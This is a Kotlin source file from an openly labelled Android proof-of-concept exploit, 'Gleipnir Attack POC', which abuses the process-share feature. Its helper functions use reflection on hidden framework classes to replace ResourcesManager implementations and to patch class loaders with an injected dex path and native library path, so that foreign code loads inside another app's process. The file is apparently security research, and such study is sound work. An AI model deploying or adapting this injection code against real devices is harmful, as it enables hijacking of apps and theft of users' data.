/*
 * Gleipnir Attack POC - Exploiting the Android process share feature
 * Copyright (C) <2020>  <Sascha Roth>
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License along
 * with this program; if not, write to the Free Software Foundation, Inc.,
 * 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
 */

package org.gleipnir.app.helpers.extensions

import android.content.pm.ApplicationInfo
import android.content.res.Resources
import android.util.ArrayMap
import org.gleipnir.app.reflectionHelper.getDeclaredMethod
import java.lang.ref.WeakReference
import java.lang.reflect.Method

fun applyNewResourceDirsLocked(resourcesManager: Any, applicationInfo: ApplicationInfo) {
    try {
        val applyNewResourceDirsLockedMethod = getDeclaredMethod(
            resourcesManager::class.java,
            "applyNewResourceDirsLocked",
                String::class.java, Array<String>::class.java

        ) as Method
        applyNewResourceDirsLockedMethod.isAccessible = true
        applyNewResourceDirsLockedMethod.invoke(
            resourcesManager,
            applicationInfo.sourceDir,
            arrayOf(applicationInfo.sourceDir)
        )
    } catch (exception: Exception) {
        val applyNewResourceDirsLockedMethod = getDeclaredMethod(
            resourcesManager::class.java,
            "applyNewResourceDirsLocked",
                ApplicationInfo::class.java, Array<String>::class.java

        ) as Method
        applyNewResourceDirsLockedMethod.isAccessible = true
        applyNewResourceDirsLockedMethod.invoke(
            resourcesManager,
            applicationInfo,
            arrayOf(applicationInfo.sourceDir)
        )
    }
}

fun getResourcesManagerInstance(): Any {
    val resourcesManagerClass = Class.forName("android.app.ResourcesManager")
    val sresourcesMethod =
        resourcesManagerClass.getDeclaredMethod("getInstance")
    sresourcesMethod.isAccessible = true
    return sresourcesMethod.invoke(null)
}

fun replaceResourcesManagerImpls(
    resourcesManager: Any,
    resourcesImpl: Any
) {

    val mResourcesImpls = resourcesManager::class.java.getDeclaredField("mResourceImpls")
    mResourcesImpls.isAccessible = true
    val map = mResourcesImpls.get(resourcesManager) as ArrayMap<WeakReference<Any>, Any>
    for (i in 0 until map.size) {
        map.setValueAt(i, WeakReference(resourcesImpl))
    }
    mResourcesImpls.set(resourcesManager, map)
}

fun patchResourcesManagerResources(
    resourcesManager: Any,
    dexPath: String,
    nativePath: String,
    resourcesImpl: Any
) {
    val setImpl: Method =
        Resources::class.java.getMethod(
            "setImpl",
            Class.forName("android.content.res.ResourcesImpl")
        )
    val mResourceReferences = resourcesManager::class.java.getDeclaredField("mResourceReferences")
    mResourceReferences.isAccessible = true
    val resourceReferences =
        mResourceReferences.get(resourcesManager) as ArrayList<WeakReference<Any>>
    val mClassLoaderField = Resources::class.java.getDeclaredField("mClassLoader")
    mClassLoaderField.isAccessible = true
    var cl: ClassLoader? = null
    resourceReferences.forEach {
        it?.get()?.let {
            cl = mClassLoaderField.get(it) as ClassLoader
            cl?.patch(dexPath, nativePath)
            setImpl.invoke(it, resourcesImpl)
        }
    }
    mResourceReferences.set(resourcesManager, resourceReferences)
}